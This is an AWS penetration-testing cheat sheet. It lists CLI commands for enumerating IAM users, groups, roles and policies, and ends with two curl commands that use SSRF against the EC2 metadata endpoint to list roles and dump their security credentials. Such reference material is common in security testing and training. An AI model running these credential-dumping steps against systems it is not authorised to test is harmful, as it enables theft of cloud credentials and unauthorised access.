# AWS

% aws

## Configure AWS cli

```
aws configure
```

## Configure AWS cli for profile

```
aws configure --profile <profil>
```

## Listing IAM access Keys

```
aws iam list-access-keys
```

## Enumerating IAM users

### Checking credentials for the user

```
aws sts get-caller-identity
```

### Listing IAM Users

```
aws iam list-users
```

### Listing the IAM groups that the specified IAM user belongs to 

```
aws iam list-groups-for-user --user-name <user-name>
```

### Listing all managed policies that are attached to the specified IAM user 

```
aws iam list-attached-user-policies --user-name <user-name>
```

### Listing the names of the inline policies embedded in the specified IAM user 

```
aws iam list-user-policies --user-name <user-name>
```

### Listing IAM Groups

```
aws iam list-groups
```

### Listing all managed policies that are attached to the specified IAM Group 

```
aws iam list-attached-group-policies --group-name <group-name>
```

### Listing the names of the inline policies embedded in the specified IAM Group

```
aws iam list-group-policies --group-name group name
```

### Listing IAM Roles

```
aws iam list-roles
```

### Listing all managed policies that are attached to the specified IAM role 

```
aws iam list-attached-role-policies --role-name  <role-name>
```

### Listing the names of the inline policies embedded in the specified IAM role 

```
aws iam list-role-policies --role-name  <role-name>
```

### Listing of IAM Policies

```
aws iam list-policies
```

### Retrieving information about the specified managed policy 

```
aws iam get-policy --policy-arn policy-arn
```

### Listing information about the versions of the specified manages policy 

```
aws iam list-policy-versions --policy-arn policy-arn
```

### Retrieving information about the specific version of the specified managed policy 

```
aws iam get-policy-version --policy-arn policy-arn --version-id version-id
```

### Retrieving the specified inline policy document that is embedded on the specified IAM user / group / role 

```
aws iam get-user-policy --user-name <user-name> --policy-name policy-name

aws iam get-group-policy --group-name <group-name> --policy-name policy-name

aws iam get-role-policy --role-name  <role-name> --policy-name policy-name
```

## SSRF in EC2

## SSRF in EC2 - List roles
#plateform/linux #target/remote #protocol/http #port/80 #cat/RECON
```
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

## SSRF in EC2 - Dump roles
#plateform/linux #target/remote #protocol/http #port/80 #cat/RECON
```
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role_name>
```
